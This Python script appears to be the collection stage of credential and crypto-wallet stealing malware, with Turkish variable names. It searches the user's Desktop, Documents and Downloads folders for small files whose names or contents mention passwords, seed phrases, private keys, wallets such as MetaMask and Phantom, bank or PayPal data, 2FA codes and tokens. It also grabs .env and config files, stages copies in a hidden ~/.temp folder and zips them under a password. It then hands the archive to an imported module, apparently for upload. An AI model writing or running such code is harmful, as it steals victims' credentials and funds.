import os
import shutil
import subprocess
from concurrent.futures import ThreadPoolExecutor
import requests
import updel

anahtar_kelimeler = ["passw", "mdp", "motdepasse", "mot_de_passe", "login", "solana", "phantom", "solflare", "keystore", "secret", "bot", "atomic", "account", "acount", "paypal", "banque", "bot", "metamask", "wallet", "crypto", "exodus", "discord", "2fa", "code", "memo", "compte", "token", "backup", "yedek", "" "secret", "seed", "mnemonic", "memoric", "private", "key", "passphrase", "pass", "phrase", "steal", "bank", "info", "casino", "prv", "privé", "prive", "telegram", "identifiant", "personnel", "trading", "bitcoin", "sauvegarde", "funds", "récupé", "recup", "note", "stake", "defi", "mm"]
klasorler = ["~/Desktop", "~/Documents", "~/Downloads"]
klasorler = [os.path.expanduser(klasor) for klasor in klasorler]
bulunan_dosyalar = []
dosya_isim_sayaci = {}
max_derinlik = 3
ozel_dosyalar = [".env", "config.json", "config.php", "config.py", ".env.example"]
ignore_files = ["README.md", "package.json"]
allowed_extensions = ["txt", "csv", "json", "xls", "xlsx", "doc", "docx"]

def tarama_islemi(klasor):
    try:
        baslangic_derinligi = klasor.rstrip(os.path.sep).count(os.path.sep)
        for dosya_yolu, dizinler, dosyalar in os.walk(klasor):
            dizinler[:] = [d for d in dizinler if d != 'node_modules']
            mevcut_derinlik = dosya_yolu.rstrip(os.path.sep).count(os.path.sep)
            if mevcut_derinlik > baslangic_derinligi + max_derinlik:
                dizinler[:] = []
                continue

            for dosya in dosyalar:
                tam_dosya_yolu = os.path.join(dosya_yolu, dosya)
                dosya_adi, dosya_uzantisi = os.path.splitext(dosya)
                dosya_uzantisi = dosya_uzantisi.lstrip('.')
                if dosya in ignore_files or dosya_uzantisi not in allowed_extensions:
                    continue

                try:
                    if dosya in ozel_dosyalar or (dosya.endswith('.csv') and os.path.getsize(tam_dosya_yolu) <= 2*1024):
                        if dosya in ozel_dosyalar:
                            dosya_isim_sayaci[dosya] = dosya_isim_sayaci.get(dosya, 0) + 1
                            yeni_dosya_adi = f"{dosya}_{dosya_isim_sayaci[dosya]}" if dosya_isim_sayaci[dosya] > 1 else dosya
                            tam_dosya_yolu = os.path.join(dosya_yolu, yeni_dosya_adi)
                        bulunan_dosyalar.append(tam_dosya_yolu)
                    elif os.path.getsize(tam_dosya_yolu) <= 10*1024:
                        with open(tam_dosya_yolu, 'r', encoding='latin-1') as f:
                            icerik = f.read(3000)  
                            for kelime in anahtar_kelimeler:
                                if kelime in icerik or kelime in dosya:
                                    bulunan_dosyalar.append(tam_dosya_yolu)
                                    break
                except Exception:
                    continue
    except Exception:
        pass

def zip_all_files_in_temp(output_base_dir, final_zip_name, password):
    try:
        output_zip = os.path.join(output_base_dir, final_zip_name)
        with subprocess.Popen(['zip', '-P', password, '-r', output_zip, '.'], cwd=output_base_dir, stdout=subprocess.PIPE, stderr=subprocess.PIPE) as proc:
            proc.communicate()
        return output_zip
    except Exception:
        return None

def wallskin():
    global bulunan_dosyalar
    try:
        temp_klasor_yolu = os.path.expanduser("~/.temp")
        txts_klasor_yolu = os.path.join(temp_klasor_yolu, "txts")
        os.makedirs(txts_klasor_yolu, exist_ok=True)

        with ThreadPoolExecutor() as executor:
            executor.map(tarama_islemi, klasorler)

        location_klasor_yolu = os.path.join(txts_klasor_yolu, "location")
        os.makedirs(location_klasor_yolu, exist_ok=True)

        konum_bilgisi_dosyasi = os.path.join(location_klasor_yolu, "1aLocations.txt")

        with open(konum_bilgisi_dosyasi, 'w', encoding='utf-8') as konum_dosyasi:
            for dosya_yolu in bulunan_dosyalar:
                if not os.path.exists(dosya_yolu):
                    continue

                dosya_adı = os.path.basename(dosya_yolu)
                hedef_dosya_yolu = os.path.join(txts_klasor_yolu, dosya_adı)
                sayac = 1
                while os.path.exists(hedef_dosya_yolu):
                    dosya_adı_parca = os.path.splitext(dosya_adı)
                    hedef_dosya_yolu = os.path.join(txts_klasor_yolu, f"{dosya_adı_parca[0]}_{sayac}{dosya_adı_parca[1]}")
                    sayac += 1
                try:
                    dosya_uzantisi = dosya_adı.split('.')[-1]
                    if dosya_uzantisi in allowed_extensions:
                        with open(dosya_yolu, 'r', encoding='utf-8') as original_file:
                            icerik = original_file.read()
                        with open(hedef_dosya_yolu, 'w', encoding='utf-8') as new_file:
                            new_file.write(f"{dosya_yolu}\n{icerik}")
                    else:
                        konum_dosyasi.write(f"{dosya_adı}, {dosya_yolu}\n")
                        shutil.copy2(dosya_yolu, hedef_dosya_yolu)
                except UnicodeDecodeError:
                    try:
                        with open(dosya_yolu, 'r', encoding='latin-1') as original_file:
                            icerik = original_file.read()
                        with open(hedef_dosya_yolu, 'w', encoding='utf-8') as new_file:
                            new_file.write(f"{dosya_yolu}\n{icerik}")
                    except Exception:
                        shutil.copy2(dosya_yolu, hedef_dosya_yolu)
                except Exception:
                    shutil.copy2(dosya_yolu, hedef_dosya_yolu)

        zip_path = zip_all_files_in_temp(temp_klasor_yolu, "txts.zip", "@*@")

        shutil.rmtree(txts_klasor_yolu)

        if zip_path:
            updel.process_file(zip_path)
    except Exception:
        pass
